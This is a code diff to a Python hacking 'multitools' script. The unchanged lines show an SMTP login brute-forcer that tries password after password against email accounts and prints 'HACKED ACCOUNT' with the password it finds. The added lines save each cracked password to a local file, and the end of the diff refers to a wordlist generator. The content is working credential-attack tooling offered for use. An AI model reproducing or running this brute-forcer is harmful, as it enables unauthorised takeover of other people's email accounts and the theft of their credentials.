@@ -81,6 +81,11 @@ if option == var1:
                 server.quit()
                 print("SUCCESS")
                 print("\033[32mHACKED ACCOUNT: @\033[0m" + Gmail,"\033[32mPASSWORD IS: \033[0m" + passw)
+                foundpasswords = open("/home/sp1derman/Desktop/multitools/Multitools/passwordsfound",'w')
+                with foundpasswords as h:
+                    h.write(passw)
+                print("Password saved at the filename: /home/sp1derman/Desktop/multitools/Multitools/passwordsfound")
+
                 break
             except smtplib.SMTPAuthenticationError:
                 print("\033[31mPassowrd incorrect: \033[0m" + passw)
@@ -119,6 +124,10 @@ elif option == var2:
                 server.login(email, password)
                 server.quit()
                 print("[+] PASSWORD FOUND: {}".format(password))
+                foundpasswords = open("/home/sp1derman/Desktop/multitools/Multitools/passwordsfound",'w')
+                with foundpasswords as h:
+                    h.write(password)
+                print("Password saved at the filename: /home/sp1derman/Desktop/multitools/Multitools/passwordsfound")
                 input("\033[0m")
             except smtplib.SMTPAuthenticationError as e:
                 if "Authentication unsuccessful" in str(e):
@@ -1394,9 +1403,3 @@ elif option == var3:
     print("Successfully wrote the generated wordlist to: " + generatedfile)
 
     input("")
-
-
-
-
-
-
